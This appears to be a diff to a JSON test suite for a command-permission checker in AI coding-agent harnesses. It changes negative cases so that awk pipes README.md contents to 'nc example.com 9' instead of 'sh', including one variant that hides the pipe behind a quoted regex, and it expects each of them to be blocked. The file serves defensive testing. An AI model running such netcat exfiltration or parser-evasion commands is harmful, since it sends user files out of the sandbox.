@@ -5920,7 +5920,7 @@
       "expect": "allow"
     },
     {
-      "id": "neg-awk-division-pipe-to-shell",
+      "id": "neg-awk-division-pipe-to-network",
       "fix_area": "negative",
       "harnesses": [
         "codex",
@@ -5931,14 +5931,14 @@
       ],
       "tool": "shell",
       "tool_input": {
-        "command": "awk '{ print $1 / 2 | \"sh\" }' README.md"
+        "command": "awk '{ print $1 / 2 | \"nc example.com 9\" }' README.md"
       },
       "cwd": "worktree",
       "expect": "not_allow",
       "contained_ok": true
     },
     {
-      "id": "neg-awk-regex-quote-hides-pipe",
+      "id": "neg-awk-regex-quote-hides-network-pipe",
       "fix_area": "negative",
       "harnesses": [
         "codex",
@@ -5949,7 +5949,7 @@
       ],
       "tool": "shell",
       "tool_input": {
-        "command": "awk '{ if ($1) /\"/; print | \"sh\" } # \"' README.md"
+        "command": "awk '{ if ($1) /\"/; print | \"nc example.com 9\" } # \"' README.md"
       },
       "cwd": "worktree",
       "expect": "not_allow",
